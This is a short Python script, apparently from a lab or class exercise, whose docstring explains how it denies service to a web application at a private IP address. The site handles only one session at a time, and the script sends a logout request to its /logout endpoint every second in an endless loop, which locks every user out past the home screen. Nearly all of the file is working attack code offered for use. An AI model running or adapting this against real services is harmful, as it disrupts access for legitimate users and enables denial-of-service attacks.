"""
This file exploits this site's inability to handle more than one user at a time
and the logout function to effectively deny any user from accessing the website.
This is done through sending logout requests every second.

This effectively denies user's the ability to update their information, as the
frequency of logout requests is enough to disable anything past the home screen
after logging in.
"""

import requests
import time

# loop to give persistent logout requests
while True:
    r = requests.post('http://10.66.28.202:8075/logout')
    # sleep to save looping a tonne
    time.sleep(1)
